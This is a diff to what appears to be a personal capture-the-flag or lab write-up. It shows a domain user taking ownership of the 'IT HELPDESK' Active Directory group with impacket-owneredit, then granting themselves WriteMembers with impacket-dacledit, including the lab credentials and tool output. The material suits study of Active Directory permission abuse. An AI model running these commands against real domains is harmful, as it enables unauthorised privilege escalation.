@@ -698,6 +698,8 @@ I have WriteOwner on `IT HELPDESK` which means i should be able to assign Generi
 
 # Abusing WriteOwner on `IT HELPDESK`
 
+https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
+
 ```python
 impacket-owneredit -action write -new-owner 'j.dillon' -target-dn 'CN=IT HELPDESK,CN=USERS,DC=NOVACART,DC=LOCAL' 'novacart.local'/'j.dillon':'novafire2008' -dc-ip 10.0.18.23
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -709,4 +711,13 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] OwnerSid modified successfully!
 ```
 Now ive modified the owner
+
+```python
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'j.dillon' -target-dn 'CN=IT HELPDESK,CN=USERS,DC=NOVACART,DC=LOCAL' 'novacart.local'/'j.dillon':'novafire2008' -dc-ip 10.0.18.23
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260501-211648.bak
+[*] DACL modified successfully!
+```
+Now i should be able to add myself to the group
 
